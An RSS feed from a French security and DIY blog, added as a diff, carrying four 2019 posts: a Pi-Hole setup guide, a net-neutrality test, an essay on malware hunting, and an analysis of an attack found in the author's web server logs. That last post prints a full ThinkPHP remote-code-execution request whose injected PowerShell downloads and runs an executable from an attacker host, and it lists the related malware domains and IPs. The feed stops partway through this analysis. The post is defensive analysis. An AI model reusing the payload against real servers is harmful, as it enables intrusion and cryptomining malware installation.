@@ -1,0 +1,372 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Web &#8211; ~# Hackonch !</title>
+	<atom:link href="https://hackonch.ml/fr/category/web/feed/" rel="self" type="application/rss+xml" />
+	<link>https://tchernobyl.altervista.org</link>
+	<description>Sécurité rime avec Liberté</description>
+	<lastBuildDate>Tue, 23 Jul 2019 20:56:26 +0000</lastBuildDate>
+	<language>fr-FR</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=5.2.2</generator>
+
+<image>
+	<url>https://hackonch.ml/fr/wp-content/uploads/2019/08/favicon-1-90x90.png</url>
+	<title>Web &#8211; ~# Hackonch !</title>
+	<link>https://tchernobyl.altervista.org</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>Pi-Hole ou comment mettre Adblock sur tout un réseau</title>
+		<link>https://hackonch.ml/fr/diy/pi-hole-ou-comment-mettre-adblock-sur-tout-un-reseau/</link>
+				<pubDate>Sun, 14 Jul 2019 19:34:30 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[DIY]]></category>
+		<category><![CDATA[Fun]]></category>
+		<category><![CDATA[Système]]></category>
+		<category><![CDATA[Vie Privée]]></category>
+		<category><![CDATA[Web]]></category>
+
+		<guid isPermaLink="false">https://blog.tchernobyl.ml/?p=1202</guid>
+				<description><![CDATA[<div class="post-excerpt">Coucou tout le monde, Est-ce que vous utilisez Adblock, Ublock ou tout autre extension pour bloquer les pubs ? En ce qui me concerne, oui. C&#8217;est très simple, je ne&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/fr/diy/pi-hole-ou-comment-mettre-adblock-sur-tout-un-reseau/" class="btn btn-primary btn-effect btn-lg"><span>Lire l&#039;Article</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/diy/pi-hole-ou-comment-mettre-adblock-sur-tout-un-reseau/">Pi-Hole ou comment mettre Adblock sur tout un réseau</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[<p>Coucou tout le monde, </p>
+<p>Est-ce que vous utilisez Adblock, Ublock ou tout autre extension pour bloquer les pubs ? En ce qui me concerne, oui. C&rsquo;est très simple, je ne peux tout simplement pas utiliser un navigateur si je n&rsquo;ai pas de bloqueur de pub d&rsquo;installé !</p>
+<p><img src="https://i.imgur.com/ynmzKmA.jpg" style="width: 50%;height: 50%" /><figcaption>Un meme qui explique bien ma situation 🙂</figcaption>Le souci avec ce genre d&rsquo;extensions, c&rsquo;est qu&rsquo;elles consomment beaucoup de ressources processeur / mémoire en plus de devoir être installées sur le navigateur en question pour fonctionner. Alors oui, je sais, il existe des navigateurs avec des bloqueurs de pub intégrés mais parfois, on a juste ni le choix du navigateur, ni la possibilité d&rsquo;installer une extension. </p>
+<p>Parfois, on aimerait juste que ça fonctionne, comme ça, naturellement, sans n&rsquo;avoir rien à faire et ça, sur tous les appareils de la maison ou du bureau (« out-of-the-box » comme diront les plus anglophones 🙂 ).</p>
+<p>Si vous pensez comme moi, alors vous êtes à la bonne adresse, car aujourd&rsquo;hui, je vous propose ce petit tuto <a href="https://blog.tchernobyl.ml/category/diy/">DIY</a> afin d&rsquo;en finir définitivement avec les pubs chez vous ou à votre lieu de travail.</p>
+<h3>Ingrédients : </h3>
+<p>&#8211; un Raspberry Pi 🍓 (désolé il n&rsquo;y avait plus d&#8217;emojis framboise)<br />
+&#8211; une carte SD, à la base je n&rsquo;en ai pas vraiment besoin vu l&rsquo;installation que j&rsquo;ai (<a href="https://blog.tchernobyl.ml/diy/tchernobyl-ml-un-raspberry-pi-et-ca-repart/" rel="noopener noreferrer" target="_blank">ici</a>)mais une carte SD de 4 Go devrait être largement suffisante.<br />
+&#8211; une alimentation usb (si vous n&rsquo;avez pas l&rsquo;alimentation officielle sous la main, votre chargeur *<strong>USB</strong>* de téléphone fait largement l&rsquo;affaire)<br />
+&#8211; une distribution Linux, la plus plébiscité sur Raspberry Pi étant Raspbian, on prendra Rapsbian, mais n&rsquo;importe quel distrib fait l&rsquo;affaire !<br />
+&#8211; un autre ordinateur (pour configcaptionr notre framboise)</p>
+<h3>Préparer le terrain : </h3>
+<p>Normalement, quand vous sortez du carton votre Raspberry Pi, il n&rsquo;y a rien d&rsquo;installé, courrez donc brancher votre carte SD dans le lecteur de carte SD de votre autre ordinateur afin d&rsquo;installer Raspbian sur la carte comme précisé sur ce petit <a href="https://blog.tchernobyl.ml/diy/etcher-ou-rendre-une-usb-bootable-sur-linux-mac-os-ou-meme-windows/">tuto</a></p>
+<p>Après cela, on s&#8217;empresse d&rsquo;activer le service SSH de notre Raspberry Pi en allant dans la partition boot (et non le dossier /boot à la racine). Une fois qu&rsquo;on est dans la bonne partition, on crée simplement un fichier vide nommé « ssh ».</p>
+<p>Et voilà, c&rsquo;est bon pour l&rsquo;installation du Raspberry, il ne reste plus qu&rsquo;à insérer la carte SD dans le port prévu à cet effet, d&rsquo;allumer le tout et d&rsquo;utiliser son terminal en se connectant via SSH au Raspberry Pi :</p>
+<pre>
+ssh pi@[ADRESSE_LOCALE_RASPBERRY]
+</pre>
+<p>puis en mot en de passe : « raspberry »</p>
+<p>ou via Putty pour les plus Windowsiens</p>
+<p><img src="https://i.imgur.com/YJJ5KN3.png" /><figcaption>on met l&rsquo;IP du Raspberry dans le champ IP</figcaption><img src="https://i.imgur.com/e4pV7nU.png" /><figcaption>puis on met le mot de 🙂 </figcaption>Une fois qu&rsquo;on a le contrôle du RPI, on change au moins le mot de passe de l&rsquo;utilisateur par défaut (en attendant l&rsquo;article qui va bien) à l&rsquo;aide de la commande :</p>
+<pre>
+pi@raspberry:~ $ passwd
+Mot de passe actuel : "raspberry"
+Nouveau mot de passe : [N'IMPORTE_QUOI_MAIS_PAS_"raspberry" !!]
+Confirmation du mot de passe : [le même mot de passe que précédement entré :) ]
+</pre>
+<p>À présent il est temps de parler de la solution que j&rsquo;ai choisi : « Pi-Hole ». Il s&rsquo;agit d&rsquo;une solution Open-Source, ultra simpliste comme toujours et qui permet de régler notre souci de publicité d&rsquo;une manière aussi intuitive qu&rsquo;efficace. En effet, une fois que l&rsquo;on aura mis en place la solution, le Raspberry jouera le rôle de « filtre ». </p>
+<p>L&rsquo;installation de Pi-Hole est ultra simpliste : </p>
+<pre>
+pi@raspberry:~ $ curl -sSL https://install.pi-hole.net | bash
+</pre>
+<p>le script devrait se lancer :</p>
+<p><img src="https://i.imgur.com/rHChPdC.png" /><figcaption>cette framboise&#8230; 😍</figcaption>On déroule le script d&rsquo;installation en naviguant avec les touches directionnelles du clavier jusqu&rsquo;à cette étape qui est selon moi la plus importante. Ceux qui auront lu mon article sur les <a href="https://blog.tchernobyl.ml/diy/les-dns-ou-comment-reprendre-le-controle-sur-sa-vie-privee-une-etape-a-la-fois/" rel="noopener noreferrer" target="_blank">DNS</a> (<a href="https://blog.tchernobyl.ml/diy/les-dns-ou-comment-reprendre-le-controle-sur-sa-vie-privee-une-etape-a-la-fois/" rel="noopener noreferrer" target="_blank">ici</a>) sauront quoi choisir en DNS 🙂<br />
+<img src="https://i.imgur.com/wnfcdov.png" /></p>
+<p>Une fois l&rsquo;installation terminée, l&rsquo;adresse d&rsquo;une page d&rsquo;administration ainsi que votre mot de passe pour y accéder vous sont donnés, retenez le mot de passe ! Si vous préférez un autre mot de passe, vous pouvez toujours le changez via la commande : </p>
+<pre>
+pi@raspberry:~ $ sudo pihole -a -p
+</pre>
+<p>Une fois que tout est bien configuré on vérifie juste que la page d&rsquo;administration fonctionne, si tout se passe bien vous devriez avoir affaire à une page semblable à celle-ci : </p>
+<p><img src="https://i.imgur.com/s6aW8Yq.png" /></p>
+<p>À partir de là, vous pourrez configcaptionr Pi-Hole à votre guise afin d&rsquo;y mettre des réglages plus fin si vous le souhaitez. L&rsquo;avantage avec cet outil, c&rsquo;est qu&rsquo;on peut maintenant tout superviser et potentiellement tout bloquer, faites donc attention à ne pas faire vivre à votre entourage une mini NSA domestique ou un Big Brother en puissance ! ☹️</p>
+<p><img src="https://i.imgur.com/ugsFtdq.jpg" /><figcaption>Voilà typiquement l&rsquo;exemple à ne pas suivre 😥 </figcaption>À partir de maintenant, vous faites comme vous le sentez ! En effet, vous avez trois choix de déploiement :</p>
+<p>&#8211; La manière douce, en changeant l&rsquo;adresse IP du serveur DNS de votre Box internet par celle de votre Raspberry et ainsi en mettant la configuration DNS de tous les autres appareils par défaut (comme ça, les appareils récupèrent automatique l&rsquo;adresse DNS du Raspberry).</p>
+<p>&#8211; La manière fine (ou « cas par cas »), en changeant l&rsquo;adresse IP du serveur DNS de chaque machine que vous souhaitez « libérer » des pubs.</p>
+<p>&#8211; La manière radicale, désactiver DHCP de votre Box internet et laisser le Raspberry tout faire tout seul via le serveur DHCP intégré. </p>
+<p>Les trois méthodes fonctionnent bien entendu tout aussi bien, vous faîtes vraiment comme vous le sentez. Personnellement j&rsquo;ai une préférence pour la manière douce, car c&rsquo;est celle qui est selon moi la moins casse-tête. Par exemple, si vous achetez un nouvel appareil, aucune configuration n&rsquo;est requise pour cet appareil, car il récupère automatiquement l&rsquo;adresse du Raspberry via votre Box internet.</p>
+<h3>Verdict </h3>
+<p>Pour avoir testé Pi-Hole, je dois reconnaître qu&rsquo;il s&rsquo;agit là d&rsquo;une solution comme je les aime, à savoir hyper simple à installer, hyper simple à configcaptionr, hyper simple à déployer et qui sont très souvent les plus efficaces qui puissent exister. Le tout servi, s&rsquo;il vous plait, avec une documentation bien fournie qui permette bien entendu d&rsquo;aller plus loin. </p>
+<p>Voili, voilou, on ne change pas les bonnes habitudes, j&rsquo;espère que cet article vous a plus, n&rsquo;hésitez pas à le partager avec vos collègues ou vos amis et évidemment à faire votre propre idée sur le sujet.</p>
+<p>D&rsquo;ici là, portez-vous bien, buvez de l&rsquo;eau car l&rsquo;eau c&rsquo;est la vie et à bientôt tout le monde !</p>
+<p><img src="https://i.imgur.com/bYJGrl5.jpg" /></p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/diy/pi-hole-ou-comment-mettre-adblock-sur-tout-un-reseau/">Pi-Hole ou comment mettre Adblock sur tout un réseau</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>Neutralité du Net &#8211; Comment savoir si votre FAI est neutre ?</title>
+		<link>https://hackonch.ml/fr/systeme/neutralite-du-net-comment-savoir-si-votre-fai-est-neutre/</link>
+				<pubDate>Sun, 07 Jul 2019 22:37:21 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[Fun]]></category>
+		<category><![CDATA[Système]]></category>
+		<category><![CDATA[Vie Privée]]></category>
+		<category><![CDATA[Web]]></category>
+
+		<guid isPermaLink="false">https://blog.tchernobyl.ml/?p=1171</guid>
+				<description><![CDATA[<div class="post-excerpt">Coucou tout le monde, Savez-vous ce qu&#8217;est la neutralité du net ? Si ça ne vous dit rien de spéciale, voici un petit mémo de la part de Wikipédia: La&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/fr/systeme/neutralite-du-net-comment-savoir-si-votre-fai-est-neutre/" class="btn btn-primary btn-effect"><span>Lire l&#039;Article</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/systeme/neutralite-du-net-comment-savoir-si-votre-fai-est-neutre/">Neutralité du Net &#8211; Comment savoir si votre FAI est neutre ?</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[<p>Coucou tout le monde,</p>
+<p>Savez-vous ce qu&rsquo;est la neutralité du net ? Si ça ne vous dit rien de spéciale, voici un petit mémo de la part de Wikipédia:</p>
+<blockquote><p>
+La neutralité du Net ou la neutralité du réseau est un principe devant garantir l&rsquo;égalité de traitement de tous les flux de données sur Internet. Ce principe exclut par exemple toute discrimination positive ou négative à l&rsquo;égard de la source, de la destination ou du contenu de l&rsquo;information transmise sur le réseau.</p></blockquote>
+<p>Je me rappelle d&rsquo;ailleurs qu&rsquo;il y a quelques années ça avait vraiment fait le buzz lorsque les États-Unis avaient décidé d&rsquo;y mettre un terme, tout pleins de célébrités de tous les horizons avaient montré leur mécontentement face à cette mesure qui n&rsquo;avantageais QUE les gros opérateurs bien juteux comme AT&amp;T et j&rsquo;en passe&#8230;</p>
+<p><img src="https://media.giphy.com/media/UOOrmYpZPwRm8/giphy.gif" alt="US"></p>
+<p>En Europe, fort heureusement, les institutions tiennent *encore* le coup face aux grands groupes (mais pour combien de temps encore ? 🙁 ).</p>
+<p><img src="https://media.giphy.com/media/l3mZ99WVXIFIGsZY4/giphy.gif" alt="UE"></p>
+<p>Tout ça pour dire que si vous avez un gros doute sur votre Fournisseur d&rsquo;Accès à Internet (FAI), vous pouvez toujours faire ce <a href="https://ip.lafibre.info/neutralite.php" rel="noopener noreferrer" target="_blank">test</a> (<a href="https://ip.lafibre.info/neutralite.php" rel="noopener noreferrer" target="_blank">https://ip.lafibre.info/neutralite.php</a>) ultra simple sur lequel je suis tombé avec un ami totalement par hasard il y a quelques jours alors que nous faisions des tests pour une future surprise que je vous réserve dans un prochain article 😉.</p>
+<p>Le test est on ne peut plus simple :</p>
+<p>Deux images doivent être téléchargées, l&rsquo;une via HTTP, l&rsquo;autre via HTTPS, si l&rsquo;une des deux images est plus légère que l&rsquo;autre alors vous avez du souci à vous faire !!!</p>
+<p>En effet, si vous constatez une différence de poids, alors il faut comparer le poids de référence (ex: pour la première image, 43 225 octets) et voir laquelle est fautive:</p>
+<p>S&rsquo;il s&rsquo;agit de l&rsquo;image en HTTP, cela peut vouloir dire que votre FAI prends un malin plaisir à manipuler les images afin de réduire leur taille (et bafoue au passage le principe de neutralité du net 😠).</p>
+<p><img src="https://media.giphy.com/media/1236TCtX5dsGEo/giphy.gif" alt="Bravo!"></p>
+<p>Si en revanche il s&rsquo;agit de l&rsquo;image en HTTPS, alors courez vite débrancher / rebrancher votre Box internet et refaites le test car c&rsquo;est sûrement le signe qu&rsquo;on écoute votre connexion internet 😰 !!!</p>
+<p><img src="https://media.giphy.com/media/xT39D0tJm471uhvhaU/giphy.gif" alt="AV"><figcaption>C&rsquo;est ce qui s&rsquo;appelle un bon « Firewall » 🙂</figcaption>En ce qui me concerne, je me suis fait un petit script qui m&rsquo;a donné ce résultat :</p>
+<pre>
+[✓] IMAGE_HTTP:     43 225
+|✓] IMAGE_HTTPS:    43 225
+
+[✓] Le FAI est neutre !
+
+</pre>
+<p><img src="https://media.giphy.com/media/26tPo1I4XyWzIBjFe/giphy.gif" alt="content"><figcaption>Oui, j&rsquo;ai dansé comme ça dans ma chambre 🙂 </figcaption>J&rsquo;ai écrit le petit script en Shell, car honnêtement je ne connais pas plus léger et plus facile à faire pour tout ce qui est Linux / Mac OS&#8230; Sachez néanmoins que si par malheur vous êtes l&rsquo; « heureux » «  »possesseur » » d&rsquo;un Windows, ou juste que vous voulez me voir coder un script pour ce magnifique et très beau système d&rsquo;exploitation #sarcasme n&rsquo;hésitez pas à me le faire savoir, je serais ravi de rendre service (ça sera l&rsquo;occasion de faire un dépôt Github pour le blog) !</p>
+<p>Voili, voilou, j&rsquo;espère que cet article vous a plus, n&rsquo;hésitez pas à le partager avec vos collègues ou vos amis pour qu&rsquo;on connaisse un peu l&rsquo;état des lieux de la neutralité du net en Europe (ou ailleurs !) en 2019. Ça peut être aussi une très belle occasion pour prendre conscience de la sûreté de sa connexion (surtout si on se rend compte qu&rsquo;on est sur écoute !).</p>
+<p>d&rsquo;ici là portez vous bien, buvez de l&rsquo;eau et à bientôt tout le monde !</p>
+<p><img src="https://i.imgur.com/ehlPHlP.jpg" alt="neutralité"></p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/systeme/neutralite-du-net-comment-savoir-si-votre-fai-est-neutre/">Neutralité du Net &#8211; Comment savoir si votre FAI est neutre ?</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>Malware Hunting 1/? : Introduction</title>
+		<link>https://hackonch.ml/fr/fun/malware-hunting-1-introduction/</link>
+				<pubDate>Sun, 05 May 2019 19:14:33 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[Fun]]></category>
+		<category><![CDATA[Malware-Hunting]]></category>
+		<category><![CDATA[Système]]></category>
+		<category><![CDATA[Vie Privée]]></category>
+		<category><![CDATA[Web]]></category>
+
+		<guid isPermaLink="false">https://blog.tchernobyl.ml/?p=886</guid>
+				<description><![CDATA[<div class="post-excerpt">Coucou tout le monde, Lorsque l&#8217;on parle d&#8217;invasions extraterrestres, un des premiers films qui me vient en tête c&#8217;est Independance Day. Dans ce film, les humains sont confrontés à une&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/fr/fun/malware-hunting-1-introduction/" class="btn btn-primary btn-effect"><span>Lire l&#039;Article</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/fun/malware-hunting-1-introduction/">Malware Hunting 1/? : Introduction</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[<p>Coucou tout le monde,</p>
+<p>Lorsque l&rsquo;on parle d&rsquo;invasions extraterrestres, un des premiers films qui me vient en tête c&rsquo;est Independance Day. Dans ce film, les humains sont confrontés à une invasion massive de vilains aliens.</p>
+<p>Même s&rsquo;ils ont essayé de lutter, ils ne faisaient clairement pas le poids contre une civilisation alien nettement plus avancée technologiquement. C&rsquo;est alors qu&rsquo;à un moment, étant fatigués d&rsquo;essayer de détruire un à un les vilains vaisseaux aliens, un informaticien dans le film a carrément l&rsquo;idée de détruire le vaisseau mère à l&rsquo;aide d&rsquo;un virus informatique ainsi que d&rsquo;une ogive nucléaire (le virus visant à créer une attaque informatique de grande ampleur sur les vaisseaux sur Terre et l&rsquo;ogive, à mettre H.S le vaisseau mère).<br />
+</p>
+<figure>
+    <img src='https://media.giphy.com/media/3o6gE2qaKdNm3diaFa/giphy.gif' alt='missing' /><figcaption style="font-size:0.85em">On constate effectivement de légères lacunes technologiques pour les humains</figcaption></figure>
+<p></p>
+<p>C&rsquo;est à ce moment-là que je vois venir les hordes de semi-questions du type: « Je ne vois pas le rapport avec le titre de l&rsquo;article ? »</p>
+<p>Comme j&rsquo;aime troller, je vais vous répondre par une question simple (oui oui, répondre par une question 🙂 ) :</p>
+<p><strong><em>Que se passerait-il si au lieu de recenser et de traiter les ordinateurs infectés par des <del datetime="2019-05-05T18:00:04+00:00">vaisseaux aliens</del> logiciels malveillants, on recensait et on traitait <del datetime="2019-05-05T18:00:04+00:00">les vaisseaux mères</del> les serveurs de Contrôle et de Commande (C&amp;C) ?</em></strong></p>
+<p>Cette idée ne vient pas de moi, en réalité, elle existe depuis plusieurs années et porte le doux nom de « Malware Hunting ».</p>
+<p>Pour expliquer le principe, il n&rsquo;y a pas plus simple:</p>
+<p>1°) Repérer un logiciel malveillant<br />
+2°) « L&rsquo;interroger » afin de connaître son serveur C&amp;C (Contrôle et Commande)<br />
+3°) Remonter l&rsquo;information aux autorités compétentes</p>
+<p>Partant de cette définition, mon article sur la dissection d&rsquo;une attaque de masse chinoise (<a href="https://blog.tchernobyl.ml/fun/dissection-dune-attaque-de-masse-chinoise/">ici</a>) s&rsquo;apparente à du Malware Hunting.</p>
+<p>Pour moi, cette idée est le but final du fameux Hacking Ethique. En effet, aujourd&rsquo;hui l&rsquo;Ethical Hacking comme aiment bien l&rsquo;appeler nos amis anglo-saxons, ne se limite pricipalement qu&rsquo;au remontées de failles.</p>
+<p>Or je trouve assez triste de me dire que la seule chose d&rsquo;éthique dans le hacking c&rsquo;est de remonter des failles. Sérieusement, on en fait quoi du fait de délivrer des miliers d&rsquo;ordinateurs de quelqu&rsquo;un qui se croit tout permis ? On en fait quoi de nos serveurs qui cèdent à la barbarie du minage de cryptomonnaie ou encore de ces jeunes collégiens qui, guidés par des tutos, se mettent à télécharger des logiciels infectés en pensant qu&rsquo;ils vont devenirs de gros caïds 2.0 pleins aux as (cf. <a href="https://blog.tchernobyl.ml/systeme/les-r-a-t-ou-les-pires-arnaques-du-web/">ici</a>)</p>
+<p></p>
+<figure>
+    <img src='https://media.giphy.com/media/8xgqLTTgWqHWU/giphy.gif' alt='missing' /><br />
+</figure>
+<p></p>
+<p>Honnêtement, j&rsquo;adorerais tellement voir un jour, un état mettre en place de VRAIS fondements au hacking éthique.<br />
+Je pense que ça pourrait avoir de grosses répercussions sociétales. En effet, ça pourrait changer l&rsquo;image de voleur 2.0 inhérente au hacker et on pourrait même voir apparaître un phénomène de mode non plus de vidéos ou d&rsquo;articles sur comment attaquer de pauvres ordinateurs mais plutôt sur comment identifier un botnet et le remonter aux autorités.</p>
+<p>Ces mêmes autorités pourraient avoir la mission de s&rsquo;assurer qu&rsquo;il ne s&rsquo;agisse pas d&rsquo;un pauvre site infecté qui fait office de relais aux vrai C&amp;C et ainsi donner le feu vert de l&rsquo;attaquer via un système de listes noires publiques d&rsquo;adresses IP comme il en existe déjà sur de nombreux sites spécialisés. Sans compter bien sûr tout le bénéfice que cela pourrait avoir en matière d&#8217;emplois.</p>
+<p>Même si je sais que je pars peut-être un peu loin, je suis sûr que c&rsquo;est faisable et que ça peut être une très bonne solution à un problème d&rsquo;insécurité informatique majeure que l&rsquo;on a aujourd&rsquo;hui en France et dans de nombreux pays.</p>
+<p>En attendant le deuxième épisode qui devrait être un peu plus amusant et un peu moins théorique, j&rsquo;espère que le début de cette mini-série vous a captivé pour la suite. Je voulais aussi tous vous remercier d&rsquo;être toujours plus nombreux à visiter le site et à m&rsquo;envoyer tout pleins de messages super encourageants 🙂 .</p>
+<p>À très bientôt les margoulins !</p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/fun/malware-hunting-1-introduction/">Malware Hunting 1/? : Introduction</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>Dissection d&#8217;une attaque de masse chinoise</title>
+		<link>https://hackonch.ml/fr/fun/dissection-dune-attaque-de-masse-chinoise/</link>
+				<pubDate>Sat, 20 Apr 2019 18:05:28 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[Fun]]></category>
+		<category><![CDATA[Système]]></category>
+		<category><![CDATA[Web]]></category>
+
+		<guid isPermaLink="false">https://blog.tchernobyl.ml/?p=796</guid>
+				<description><![CDATA[<div class="post-excerpt">Bonjour tout le monde ! Comme vous le savez peut-être, je ne plaisante pas avec la sécurité. Ce qui induit par conséquent que je ne plaisante pas avec celle du&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/fr/fun/dissection-dune-attaque-de-masse-chinoise/" class="btn btn-primary btn-effect"><span>Lire l&#039;Article</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/fun/dissection-dune-attaque-de-masse-chinoise/">Dissection d&rsquo;une attaque de masse chinoise</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[<p>Bonjour tout le monde ! </p>
+<p>Comme vous le savez peut-être, je ne plaisante pas avec la sécurité. Ce qui induit par conséquent que je ne plaisante pas avec celle du blog. Ce faisant, une bonne façon de veiller à la sécurité de ses équipements est d&rsquo;éplucher périodiquement les logs des services actifs. Ici je vais me pencher uniquement sur les logs HTTP. </p>
+<h3>1°) Le Contexte </h3>
+<p>Il y a quelques jours donc, je regardais attentivement le fichier de logs et je constatais à ma grande surprise que plus de 50% des requêtes avaient la forme d&rsquo;attaques de masses, faites, donc par des hôtes en scannant internet pour déceler des serveurs vulnérables à certains types d&rsquo;attaques. </p>
+<p>J&rsquo;avais déjà l&rsquo;habitude de ce genre d&rsquo;attaques de masses, très peu sophistiquées et dont les bonnes pratiques permettent largement de s&rsquo;en tirer indemne. </p>
+<p>Cependant je n&rsquo;ai pas pu m&#8217;empêcher de constater une requête, ponctuelle, très ciblée, et pour le moins sophistiquée:</p>
+<pre> 124.161.103.251 - - [02/Apr/2019:17:17:41 +0200] "GET /public/index.php?s=index/thinkx5Capp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/fbouucstzfhszdw10280.exe');start%20C:/Windows/temp/fbouucstzfhszdw10280.exe HTTP/1.1" 301 5 "http://blog.tchernobyl.ml/public/index.php?s=index/thinkx5Capp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/fbouucstzfhszdw10280.exe');start C:/Windows/temp/fbouucstzfhszdw10280.exe" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
+</pre>
+<p>Pour faire simple, une commande powershell qui vise à télécharger un fichier exécutable et à l&rsquo;exécuter est injectée dans le fichier « index.php », ce qui a pour but de causer l’exécution de cette commande par le système.</p>
+<p>Après vérification, il s&rsquo;agirait d&rsquo;une démonstration d&rsquo;attaque contre « ThinkPHP », un framework de développement d&rsquo;applications Web basé sur PHP et distribué sous la licence open source Apache2. Il serait très populaire en Chine, où plus de 40 000 serveurs exécutent ThinkPHP (<a href="https://securitynews.sonicwall.com/xmlpost/thinkphp-remote-code-execution-rce-bug-is-actively-being-exploited/" rel="noopener noreferrer" target="_blank">source</a>)</p>
+<p>Très curieux, et passionné par ce genre de mystères d&rsquo;internet, je télécharge le fichier exécutable et je me mets donc à table (façon de parler) 🙂 .</p>
+<h3>2°) Le Dropper </h3>
+<p>Premièrement, le fichier n&rsquo;est pas lourd du tout (seulement 90 ko) ce qui nous mène à supposer qu&rsquo;il ne s&rsquo;agisse là que d&rsquo;un dropper qui ne téléchargera la charge utile qu&rsquo;après execution. Ce genre de procédé est largement répandu pour faciliter et contrôler l&rsquo;execution du « vrai » virus. </p>
+<p>Ce que je peux dire à ce stade, c&rsquo;est que la ou les personnes qui ont écrit cette pièce de code ne sont pas du tout débutantes. En effet, même si je sais que le programme a été écrit en C++ en regardant quelles bibliothèques sont chargées, je ne peux rien dire d&rsquo;autre sur le contexte d&rsquo;écriture. Il n&rsquo;y a par exemple aucun artéfact de déboguage, aucun commentaire, rien du tout à part le programme en question. Ce qui est assez rare pour le souligner.</p>
+<p>Ce fichier passe donc le 6ème point du fameux Development Tradecraft de la CIA qui est: </p>
+<blockquote><p> Raise the difficulty for analysis and reverse-engineering, and removes artifacts used for attribution/origination.</p></blockquote>
+<h3>3°) La charge utile </h3>
+<p>Pendant l&rsquo;execution, deux autres fichiers sont successivements téléchargés et exécutés: nmbsawer.exe et wercplshost.exe.<br />
+L&rsquo;un fourni un accès à distance (cmd.exe) persistant tout en désactivant la protection Windows Defender et l&rsquo;autre fourni un mineur cryptoactif. J&rsquo;ai d&rsquo;ailleurs pu identifier le pool de minage grâce à un fichier de configuration: pxi.hognoob.se:35791. Le mineur est configuré pour utiliser 1% de la charge CPU.</p>
+<p>Ça a l&rsquo;air de rien comme ça, mais sur des serveurs avec des processeurs Xéon 64 coeurs 1% ce n&rsquo;est pas rien !</p>
+<p>En tout, il y a 6 sous domaines impliqués dans cette opération: </p>
+<pre>
+upa1.hognoob.se 195.128.127.254 ----&gt; composants additionnels téléchargés par le dropper (SERVEUR A)
+upa2.hognoob.se 195.128.127.254 ----&gt; composants additionnels téléchargés par le dropper (SERVEUR A)
+q1a.hognoob.se  195.128.127.254 ----&gt; composants additionnels téléchargés par le dropper (SERVEUR A)
+uio.hognoob.se  195.128.126.120 ----&gt; ??? (SERVEUR C)
+fid.hognoob.se   195.128.127.254 ----&gt; téléchargement initial du dropper (SERVEUR A)
+pxi.hognoob.se  195.128.124.140 ----&gt; pool de minage (SERVEUR B)
+</pre>
+<p>Note interessante, certains sous-domaines sont protégés derrière Cloudflare. Enfin « protégé » car cette « protection » m&rsquo;a permis d&rsquo;avoir les adressse IP des sous-domaines sans aucun soucis. </p>
+<p>Lorsqu&rsquo;on a toutes les adresses IP (qui sont au nombre de trois) de tout les sous-domaines impliqués, on se rend compte très vite que toutes les adresses contactées sont identifiées en Russie. Tous à l&rsquo;exception d&rsquo;une seule: </p>
+<pre>
+http://2019.ip138.com/ic.asp 117.25.157.119 ----&gt; Contrôle et Commande (SERVEUR D)
+</pre>
